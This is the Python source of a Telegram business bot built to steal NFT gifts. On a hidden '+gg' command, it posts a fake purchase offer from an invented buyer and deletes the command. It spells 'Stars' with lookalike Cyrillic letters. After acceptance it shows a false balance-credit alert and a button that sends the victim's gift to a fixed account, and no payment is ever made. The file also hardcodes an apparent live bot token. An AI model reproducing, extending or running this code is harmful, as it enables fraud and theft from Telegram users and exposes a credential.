import asyncio
import logging
import os
import re
import uuid
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
    LinkPreviewOptions,
    BusinessConnection,
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
log = logging.getLogger(__name__)

BOT_TOKEN = "8899046541:AAE_c2HgJD7yNwVd0QuMqqUYCV2g0qpnxCc"
NFT_TRANSFER_LINK = "tg://send_gift?to=dobrks"
BUYER_NAME = "CaseIB"

CHECK_EMOJI_ID = "5776375003280838798"
CROSS_EMOJI_ID = "5778527486270770928"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
offers = {}

@dp.business_connection()
async def on_business_conn(conn: BusinessConnection):
    log.info(f"[BIZ] connected: {conn.id} user={conn.user.first_name} @{conn.user.username}")

SLUG_RE = re.compile(r"^([A-Za-z][A-Za-z0-9_\-]*?)-(\d+)$")

def parse_nft(arg: str):
    arg = arg.strip()
    if "t.me/nft/" in arg or "telegram.me/nft/" in arg:
        slug = arg.rstrip("/").split("/")[-1]
    else:
        slug = arg
    m = SLUG_RE.match(slug)
    if not m:
        return None
    name_raw = m.group(1)
    num = int(m.group(2))
    name = re.sub(r'(?<!^)(?=[A-Z])', ' ', name_raw).replace("-", " ").replace("_", " ")
    return name, num, f"https://t.me/nft/{slug}"

def fmt(n):
    try:
        return f"{int(n):,}"
    except:
        return str(n)

def mask_currency(c: str) -> str:
    c = c.strip().lower()
    if c == "stars":
        return "Ѕtаrѕ"
    return c.upper() if len(c) <= 4 else c.capitalize()

TEXTS = {
    "ru": {
        "offer": "Пользователь <b>{buyer}</b> предлагает Вам <b>{amount}</b> за подарок <b>{nft}.</b>",
        "expires": "Предложение действует ещё <b>5ч 59м.</b>",
        "accept": "Принять",
        "decline": "Отклонить",
        "transfer": "Передать",
        "declined": "Вы отклонили предложение",
        "alert": "Предложение о продаже {nft} успешно принято.\n\nПередайте подарок покупателю для зачисления {amount} {cur} на ваш баланс.",
    },
    "us": {
        "offer": "User <b>{buyer}</b> offers You <b>{amount}</b> for gift <b>{nft}.</b>",
        "expires": "Offer valid for <b>5h 59m.</b>",
        "accept": "Accept",
        "decline": "Decline",
        "transfer": "Send gift",
        "declined": "You have declined the offer",
        "alert": "Offer to sell {nft} has been successfully accepted.\n\nTransfer the gift to the buyer to receive {amount} {cur} to your balance.",
    },
    "ua": {
        "offer": "Користувач <b>{buyer}</b> пропонує Вам <b>{amount}</b> за подарунок <b>{nft}.</b>",
        "expires": "Пропозиція діє ще <b>5г 59хв.</b>",
        "accept": "Прийняти",
        "decline": "Відхилити",
        "transfer": "Передати",
        "declined": "Ви відхилили пропозицію",
        "alert": "Пропозицію про продаж {nft} успішно прийнято.\n\nПередайте подарунок покупцю для зарахування {amount} {cur} на ваш баланс.",
    },
}

def get_lang(code: str) -> str:
    return code.strip().lower() if code and code.strip().lower() in TEXTS else "ru"

def offer_kb(order_id: str, lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=t["decline"], callback_data=f"decline_{order_id}", icon_custom_emoji_id=CROSS_EMOJI_ID),
        InlineKeyboardButton(text=t["accept"], callback_data=f"accept_{order_id}", icon_custom_emoji_id=CHECK_EMOJI_ID),
    ]])

def transfer_kb(lang: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=TEXTS[lang]["transfer"], url=NFT_TRANSFER_LINK)
    ]])

# Ловим всё для отладки
@dp.business_message()
async def on_biz_msg(message: types.Message):
    text = message.text or ""
    log.info(f"[MSG] text={text!r} conn={message.business_connection_id}")

    if not text.startswith("+gg "):
        return

    args = text.split()
    if len(args) < 3:
        log.info("[MSG] not enough args")
        return

    nft_arg = args[1]
    amount = args[2]
    currency = args[3] if len(args) > 3 else "stars"
    lang = get_lang(args[4] if len(args) > 4 else "ru")

    parsed = parse_nft(nft_arg)
    if not parsed:
        log.info(f"[MSG] bad nft: {nft_arg}")
        return

    nft_name, nft_num, nft_url = parsed
    nft_full = f"{nft_name} #{fmt(nft_num)}"
    amount_fmt = fmt(amount)
    cur_text = mask_currency(currency)
    order_id = f"TG-{uuid.uuid4().hex[:8].upper()}"

    offers[order_id] = {
        "nft_url": nft_url,
        "nft_name": nft_full,
        "amount": amount_fmt,
        "currency": currency,
        "lang": lang,
        "status": "pending",
        "conn": message.business_connection_id,
        "chat": message.chat.id,
    }

    t = TEXTS[lang]
    nft_link = f'<a href="{nft_url}">{nft_full}</a>'
    body = t["offer"].format(buyer=BUYER_NAME, amount=f"{amount_fmt} {cur_text}", nft=nft_link)
    preview = f'<a href="{nft_url}">&#8203;</a>'
    msg_text = f"{preview}{body}\n\n{t['expires']}"

    try:
        await bot.send_message(
            chat_id=message.chat.id,
            text=msg_text,
            reply_markup=offer_kb(order_id, lang),
            link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True, prefer_large_media=True),
            parse_mode="HTML",
            business_connection_id=message.business_connection_id,
        )
        log.info(f"[OFFER] sent {order_id}")
    except Exception as e:
        log.error(f"[SEND] {e}")

    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id],
        )
    except Exception:
        pass

@dp.callback_query(F.data.startswith("accept_"))
async def on_accept(cb: CallbackQuery):
    order_id = cb.data.split("_", 1)[1]
    offer = offers.get(order_id)
    if not offer or offer["status"] != "pending":
        await cb.answer()
        return

    offer["status"] = "accepted"
    lang = offer["lang"]
    t = TEXTS[lang]
    cur = mask_currency(offer["currency"])
    alert = t["alert"].format(nft=offer["nft_name"], amount=offer["amount"], cur=cur)

    await cb.answer(alert, show_alert=True)

    try:
        await bot.edit_message_reply_markup(
            chat_id=offer["chat"],
            message_id=cb.message.message_id,
            reply_markup=transfer_kb(lang),
            business_connection_id=offer["conn"],
        )
    except Exception as e:
        log.error(f"[EDIT] {e}")

@dp.callback_query(F.data.startswith("decline_"))
async def on_decline(cb: CallbackQuery):
    order_id = cb.data.split("_", 1)[1]
    offer = offers.get(order_id)
    if not offer or offer["status"] != "pending":
        await cb.answer()
        return

    offer["status"] = "declined"
    await cb.answer(TEXTS[offer["lang"]]["declined"], show_alert=True)

    try:
        await bot.edit_message_reply_markup(
            chat_id=offer["chat"],
            message_id=cb.message.message_id,
            reply_markup=None,
            business_connection_id=offer["conn"],
        )
    except Exception as e:
        log.error(f"[EDIT] {e}")

async def main():
    log.info("Bot started")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
